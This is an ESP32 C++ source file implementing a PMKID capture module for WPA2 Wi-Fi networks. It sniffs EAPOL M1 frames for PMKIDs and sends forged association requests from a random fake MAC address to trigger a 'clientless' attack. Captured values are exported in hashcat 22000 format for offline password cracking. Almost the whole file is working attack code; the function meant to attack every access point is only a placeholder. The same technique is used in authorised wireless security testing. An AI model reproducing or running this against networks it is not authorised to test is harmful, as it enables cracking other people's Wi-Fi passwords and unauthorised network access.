#include "PMKIDCapture.h"
#include <esp_wifi.h>

// Initialize static members
std::vector<PMKIDInfo> PMKIDCapture::pmkids;
uint32_t PMKIDCapture::association_sent_count = 0;
unsigned long PMKIDCapture::last_association_time = 0;
uint8_t PMKIDCapture::fake_sta_mac[6] = {0};

PMKIDCapture::PMKIDCapture() {
    // Constructor
}

void PMKIDCapture::beginPassive() {
    // Clear previous captures
    pmkids.clear();
    association_sent_count = 0;

    // Generate random MAC for clientless attacks
    generateFakeMAC();

    Serial.println("[PMKID] Passive capture started");
    Serial.println("[PMKID] Monitoring for EAPOL M1 frames with PMKID...");
    Serial.printf("[PMKID] Fake MAC for clientless attacks: %s\n", macToString(fake_sta_mac).c_str());
}

void PMKIDCapture::stop() {
    Serial.println("[PMKID] Stopped");
    Serial.printf("[PMKID] Total PMKIDs captured: %u\n", pmkids.size());
}

void PMKIDCapture::processEAPOL_M1(const uint8_t* eapol_data, uint16_t len,
                                    const uint8_t* ap_mac, const uint8_t* sta_mac,
                                    int8_t rssi, uint8_t channel, const String& ssid) {
    if (len < 99) return;  // EAPOL M1 minimum size

    // EAPOL Key frame structure (from PacketSniffer.h)
    // Offset 0: version, type, length, descriptor_type, key_info (10 bytes)
    // Offset 10: key_length (2 bytes)
    // Offset 12: replay_counter (8 bytes)
    // Offset 20: key_nonce (32 bytes)
    // Offset 52: key_iv (16 bytes)
    // Offset 68: key_rsc (8 bytes)
    // Offset 76: key_id (8 bytes)
    // Offset 84: key_mic (16 bytes)
    // Offset 100: key_data_length (2 bytes)
    // Offset 102: key_data (variable)

    // Parse key data length (big-endian)
    uint16_t key_data_len = (eapol_data[100] << 8) | eapol_data[101];

    if (len < 102 + key_data_len) return;  // Invalid length

    // Extract PMKID from key data
    uint8_t pmkid[16];
    bool found = extractPMKID(&eapol_data[102], key_data_len, pmkid);

    if (found) {
        // Check if we already have this PMKID
        for (const auto& existing : pmkids) {
            if (memcmp(existing.ap_mac, ap_mac, 6) == 0 &&
                memcmp(existing.sta_mac, sta_mac, 6) == 0 &&
                memcmp(existing.pmkid, pmkid, 16) == 0) {
                // Duplicate, skip
                return;
            }
        }

        // New PMKID!
        PMKIDInfo info;
        memcpy(info.ap_mac, ap_mac, 6);
        memcpy(info.sta_mac, sta_mac, 6);
        memcpy(info.pmkid, pmkid, 16);
        info.ssid = ssid;
        info.channel = channel;
        info.rssi = rssi;
        info.timestamp = millis();
        info.is_valid = true;
        info.is_clientless = (memcmp(sta_mac, fake_sta_mac, 6) == 0);

        pmkids.push_back(info);

        Serial.println();
        Serial.println("╔════════════════════════════════════════════════════════════╗");
        Serial.println("║            ★★★ PMKID CAPTURED! ★★★                       ║");
        Serial.println("╚════════════════════════════════════════════════════════════╝");
        Serial.printf("  SSID:     %s\n", ssid.c_str());
        Serial.printf("  AP:       %s\n", macToString(ap_mac).c_str());
        Serial.printf("  Client:   %s%s\n", macToString(sta_mac).c_str(),
                      info.is_clientless ? " (fake/clientless)" : "");
        Serial.printf("  Channel:  %u\n", channel);
        Serial.printf("  RSSI:     %d dBm\n", rssi);
        Serial.printf("  PMKID:    ");
        for (int i = 0; i < 16; i++) {
            Serial.printf("%02X", pmkid[i]);
        }
        Serial.println();
        Serial.println("════════════════════════════════════════════════════════════");
        Serial.println("✓ Ready for hashcat cracking (mode 22000)");
        Serial.println();
    }
}

bool PMKIDCapture::extractPMKID(const uint8_t* eapol_key_data, uint16_t data_len, uint8_t* pmkid_out) {
    // Parse Key Data for PMKID KDE (Key Data Encapsulation)
    // Format: Tag(0xDD) | Length | OUI(00:0F:AC) | Type(0x04) | PMKID(16 bytes)

    uint16_t offset = 0;
    while (offset + 2 < data_len) {
        uint8_t tag = eapol_key_data[offset];
        uint8_t length = eapol_key_data[offset + 1];

        if (tag == 0xDD && length >= 20) {  // Vendor Specific
            // Check OUI: 00:0F:AC (WiFi Alliance)
            if (eapol_key_data[offset + 2] == 0x00 &&
                eapol_key_data[offset + 3] == 0x0F &&
                eapol_key_data[offset + 4] == 0xAC) {

                // Check Type: 0x04 (PMKID KDE)
                if (eapol_key_data[offset + 5] == 0x04) {
                    // Extract PMKID (16 bytes starting at offset + 6)
                    if (offset + 6 + 16 <= data_len) {
                        memcpy(pmkid_out, &eapol_key_data[offset + 6], 16);
                        return true;
                    }
                }
            }
        }

        offset += 2 + length;
    }

    return false;  // No PMKID found
}

void PMKIDCapture::sendAssociationRequest(const uint8_t* ap_mac, const String& ssid) {
    // Rate limiting
    unsigned long now = millis();
    if (now - last_association_time < 500) {  // Min 500ms between requests
        Serial.println("[PMKID] Rate limited - wait 500ms between association requests");
        return;
    }
    last_association_time = now;

    Serial.println();
    Serial.println("╔════════════════════════════════════════════════════════════╗");
    Serial.println("║       CLIENTLESS PMKID ATTACK (Association Request)       ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.printf("  Target AP:  %s\n", macToString(ap_mac).c_str());
    Serial.printf("  SSID:       %s\n", ssid.length() > 0 ? ssid.c_str() : "(broadcast)");
    Serial.printf("  Fake STA:   %s\n", macToString(fake_sta_mac).c_str());
    Serial.println("════════════════════════════════════════════════════════════");

    // Build association request frame
    uint8_t assoc_frame[512];
    size_t frame_len = 0;
    buildAssociationRequest(assoc_frame, &frame_len, ap_mac, fake_sta_mac, ssid);

    // Send association request
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, assoc_frame, frame_len, false);

    if (result == ESP_OK) {
        Serial.println("✓ Association request sent");
        Serial.println("→ Waiting for M1 with PMKID (should arrive within 1-2 seconds)...");
        association_sent_count++;
    } else {
        Serial.printf("✗ Failed to send association request (error %d)\n", result);
    }
    Serial.println();
}

void PMKIDCapture::attackAllAPs() {
    Serial.println("\n[PMKID] Attacking all discovered APs on current channel...");
    Serial.println("[PMKID] This may take several seconds...\n");

    // This would need access to the device list from PacketSniffer
    // For now, just a placeholder
    Serial.println("[PMKID] Note: Integrate with PacketSniffer::getDevices() to auto-attack all APs");
}

void PMKIDCapture::buildAssociationRequest(uint8_t* frame, size_t* frame_len,
                                            const uint8_t* ap_mac, const uint8_t* sta_mac,
                                            const String& ssid) {
    // 802.11 Association Request frame structure:
    // Frame Control (2) + Duration (2) + Dest (6) + Src (6) + BSSID (6) + Seq (2)
    // + Capability Info (2) + Listen Interval (2) + SSID IE + Supported Rates IE

    uint16_t seq_num = 0;
    size_t offset = 0;

    // Frame Control: Type=Management (0), Subtype=Association Request (0)
    frame[offset++] = 0x00;  // 00000000 = version 0, type 00 (management), subtype 0000 (assoc req)
    frame[offset++] = 0x00;  // Flags

    // Duration
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;

    // Destination MAC (AP)
    memcpy(&frame[offset], ap_mac, 6);
    offset += 6;

    // Source MAC (fake client)
    memcpy(&frame[offset], sta_mac, 6);
    offset += 6;

    // BSSID (AP)
    memcpy(&frame[offset], ap_mac, 6);
    offset += 6;

    // Sequence Control
    frame[offset++] = seq_num & 0xFF;
    frame[offset++] = (seq_num >> 8) & 0xFF;

    // === Association Request Body ===

    // Capability Info (supports ESS)
    frame[offset++] = 0x01;  // ESS
    frame[offset++] = 0x00;

    // Listen Interval
    frame[offset++] = 0x0A;  // 10
    frame[offset++] = 0x00;

    // SSID Information Element
    frame[offset++] = 0x00;  // Tag: SSID
    if (ssid.length() > 0 && ssid.length() <= 32) {
        frame[offset++] = ssid.length();  // Length
        memcpy(&frame[offset], ssid.c_str(), ssid.length());
        offset += ssid.length();
    } else {
        frame[offset++] = 0x00;  // Broadcast SSID
    }

    // Supported Rates IE (basic rates)
    frame[offset++] = 0x01;  // Tag: Supported Rates
    frame[offset++] = 0x08;  // Length: 8 rates
    frame[offset++] = 0x82;  // 1 Mbps (basic)
    frame[offset++] = 0x84;  // 2 Mbps (basic)
    frame[offset++] = 0x8B;  // 5.5 Mbps (basic)
    frame[offset++] = 0x96;  // 11 Mbps (basic)
    frame[offset++] = 0x24;  // 18 Mbps
    frame[offset++] = 0x30;  // 24 Mbps
    frame[offset++] = 0x48;  // 36 Mbps
    frame[offset++] = 0x6C;  // 54 Mbps

    // RSN IE (WPA2) - Required to trigger PMKID in M1
    frame[offset++] = 0x30;  // Tag: RSN
    frame[offset++] = 0x14;  // Length: 20 bytes
    frame[offset++] = 0x01;  // Version 1
    frame[offset++] = 0x00;
    // Group Cipher Suite: AES-CCMP
    frame[offset++] = 0x00;  // OUI
    frame[offset++] = 0x0F;
    frame[offset++] = 0xAC;
    frame[offset++] = 0x04;  // AES-CCMP
    // Pairwise Cipher Suite Count
    frame[offset++] = 0x01;
    frame[offset++] = 0x00;
    // Pairwise Cipher Suite: AES-CCMP
    frame[offset++] = 0x00;  // OUI
    frame[offset++] = 0x0F;
    frame[offset++] = 0xAC;
    frame[offset++] = 0x04;  // AES-CCMP
    // AKM Suite Count
    frame[offset++] = 0x01;
    frame[offset++] = 0x00;
    // AKM Suite: PSK
    frame[offset++] = 0x00;  // OUI
    frame[offset++] = 0x0F;
    frame[offset++] = 0xAC;
    frame[offset++] = 0x02;  // PSK
    // RSN Capabilities
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;

    *frame_len = offset;
}

String PMKIDCapture::exportHashcat(const PMKIDInfo& pmkid) {
    if (!pmkid.is_valid) {
        return "Invalid PMKID";
    }

    // Hashcat 22000 format for PMKID:
    // WPA*01*PMKID*AP_MAC*STA_MAC*SSID_HEX

    String output = "WPA*01*";

    // PMKID in hex
    for (int i = 0; i < 16; i++) {
        char hex[3];
        sprintf(hex, "%02X", pmkid.pmkid[i]);
        output += String(hex);
    }
    output += "*";

    // AP MAC
    for (int i = 0; i < 6; i++) {
        char hex[3];
        sprintf(hex, "%02X", pmkid.ap_mac[i]);
        output += String(hex);
    }
    output += "*";

    // Station MAC
    for (int i = 0; i < 6; i++) {
        char hex[3];
        sprintf(hex, "%02X", pmkid.sta_mac[i]);
        output += String(hex);
    }
    output += "*";

    // SSID in hex
    for (size_t i = 0; i < pmkid.ssid.length(); i++) {
        char hex[3];
        sprintf(hex, "%02X", (unsigned char)pmkid.ssid[i]);
        output += String(hex);
    }

    return output;
}

void PMKIDCapture::printSummary() {
    Serial.println("\n╔═══════════════════════════════════════════════════════════════╗");
    Serial.printf("║  CAPTURED PMKIDs: %u                                         \n", pmkids.size());
    Serial.println("╚═══════════════════════════════════════════════════════════════╝");

    if (pmkids.empty()) {
        Serial.println("  No PMKIDs captured yet.");
        Serial.println();
        Serial.println("  Tips:");
        Serial.println("  - Wait for clients to connect (passive)");
        Serial.println("  - Use clientless attack: sendAssociationRequest()");
        Serial.println("  - PMKIDs are in EAPOL M1 (first handshake message)");
        return;
    }

    for (size_t i = 0; i < pmkids.size(); i++) {
        const PMKIDInfo& pmkid = pmkids[i];

        Serial.printf("\n[%u] %s\n", i + 1, pmkid.ssid.c_str());
        Serial.printf("    AP:      %s\n", macToString(pmkid.ap_mac).c_str());
        Serial.printf("    Client:  %s%s\n", macToString(pmkid.sta_mac).c_str(),
                      pmkid.is_clientless ? " (clientless)" : "");
        Serial.printf("    Channel: %u | RSSI: %d dBm\n", pmkid.channel, pmkid.rssi);
        Serial.printf("    PMKID:   ");
        for (int j = 0; j < 16; j++) {
            Serial.printf("%02X", pmkid.pmkid[j]);
        }
        Serial.println();
        Serial.printf("    Age:     %lu seconds\n", (millis() - pmkid.timestamp) / 1000);
        Serial.println("    [Ready for hashcat]");
    }
    Serial.println();
}

String PMKIDCapture::macToString(const uint8_t* mac) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

void PMKIDCapture::generateFakeMAC() {
    // Generate random MAC with locally administered bit set
    // First byte: bit 1 = 1 (locally administered), bit 0 = 0 (unicast)
    fake_sta_mac[0] = 0x02 | (esp_random() & 0xFC);  // 0x02, 0x06, 0x0A, 0x0E, etc.

    for (int i = 1; i < 6; i++) {
        fake_sta_mac[i] = esp_random() & 0xFF;
    }

    Serial.printf("[PMKID] Generated fake MAC: %s\n", macToString(fake_sta_mac).c_str());
}
